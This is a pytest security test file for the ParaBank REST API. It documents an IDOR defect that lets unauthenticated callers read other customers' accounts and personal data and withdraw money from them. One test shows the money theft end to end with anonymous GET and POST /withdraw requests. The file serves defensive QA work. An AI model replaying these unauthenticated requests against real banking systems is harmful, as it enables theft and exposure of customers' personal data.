"""ParaBank REST API — authentication / authorization tests.

Defect D-09 (critical): the REST API enforces no authentication or
authorization whatsoever. Every endpoint accepts an unauthenticated request
and operates on any account or customer id supplied in the URL — a textbook
IDOR (Insecure Direct Object Reference). An attacker who only knows (or
guesses — ids are sequential) a victim's account id can read their PII and
withdraw their money.

These tests are written the way the API *should* behave (the request must be
rejected) and marked xfail(strict=True), so the suite turns green the moment
ParaBank adds access control. The accompanying *_is_currently_unprotected
tests document the live broken behavior without asserting it is correct.
"""

import allure
import httpx
import pytest

from utils.parabank_api import ParabankApi, register_customer


@pytest.fixture
def victim_account(base_url: str) -> tuple[int, int]:
    """Register an isolated 'victim' customer; return (customer_id, account_id).

    Separate from the main `customer_id`/`account_pair` fixtures so the attack
    crosses a real tenant boundary: the attacker never authenticated as this user.
    """
    creds = register_customer(base_url)
    api = ParabankApi(base_url)
    try:
        customer_id = api.login(creds).json()["id"]
        account_id = api.get_accounts(customer_id).json()[0]["id"]
    finally:
        api.close()
    return customer_id, account_id


@pytest.fixture
def anonymous_client(base_url: str) -> httpx.Client:
    """A raw client with no cookies, no session, no auth header — the attacker."""
    with httpx.Client(
        base_url=f"{base_url}/parabank/services/bank",
        headers={"Accept": "application/json"},
        timeout=30,
    ) as client:
        yield client


@allure.feature("Security")
@allure.story("Authentication & authorization")
@allure.severity(allure.severity_level.BLOCKER)
@pytest.mark.api
@pytest.mark.security
class TestApiRequiresAuthorization:
    @pytest.mark.xfail(
        reason="Defect D-09: API returns another customer's account to an "
        "unauthenticated caller (IDOR)",
        strict=True,
    )
    def test_reading_foreign_account_is_rejected(
        self, anonymous_client: httpx.Client, victim_account: tuple[int, int]
    ) -> None:
        _, account_id = victim_account
        response = anonymous_client.get(f"/accounts/{account_id}")
        with allure.step("An unauthenticated request for another user's account must be denied"):
            assert response.status_code in (401, 403), (
                f"Expected 401/403, got {response.status_code}: leaked {response.text}"
            )

    @pytest.mark.xfail(
        reason="Defect D-09: API returns another customer's PII to an "
        "unauthenticated caller (IDOR)",
        strict=True,
    )
    def test_reading_foreign_customer_pii_is_rejected(
        self, anonymous_client: httpx.Client, victim_account: tuple[int, int]
    ) -> None:
        customer_id, _ = victim_account
        response = anonymous_client.get(f"/customers/{customer_id}")
        with allure.step("An unauthenticated request for another user's profile must be denied"):
            assert response.status_code in (401, 403), (
                f"Expected 401/403, got {response.status_code}: leaked {response.text}"
            )

    @pytest.mark.xfail(
        reason="Defect D-09: API lets an unauthenticated caller withdraw from "
        "another customer's account — money theft",
        strict=True,
    )
    def test_withdrawing_from_foreign_account_is_rejected(
        self, anonymous_client: httpx.Client, victim_account: tuple[int, int]
    ) -> None:
        _, account_id = victim_account
        response = anonymous_client.post(
            "/withdraw", params={"accountId": account_id, "amount": "100"}
        )
        with allure.step("An unauthenticated withdrawal from another account must be denied"):
            assert response.status_code in (401, 403), (
                f"Expected 401/403, got {response.status_code}: {response.text}"
            )


@allure.feature("Security")
@allure.story("Authentication & authorization")
@allure.severity(allure.severity_level.BLOCKER)
@pytest.mark.api
@pytest.mark.security
def test_money_theft_is_currently_possible(
    anonymous_client: httpx.Client, victim_account: tuple[int, int]
) -> None:
    """Living proof of D-09: documents the exploit end to end.

    Asserts the *currently broken* behavior so the report shows a passing,
    explicit demonstration of the vulnerability rather than only an xfail.
    Pairs with the strict-xfail tests above, which flip to failing once the
    hole is closed — at which point this test should be deleted.
    """
    _, account_id = victim_account
    with allure.step("Attacker reads the victim's balance with no credentials"):
        before = anonymous_client.get(f"/accounts/{account_id}").json()["balance"]
    with allure.step("Attacker withdraws $100 from the victim's account"):
        stolen = anonymous_client.post(
            "/withdraw", params={"accountId": account_id, "amount": "100"}
        )
        assert stolen.status_code == 200
    with allure.step("The victim's balance dropped — money left the account"):
        after = anonymous_client.get(f"/accounts/{account_id}").json()["balance"]
        assert after == pytest.approx(before - 100, abs=0.01)
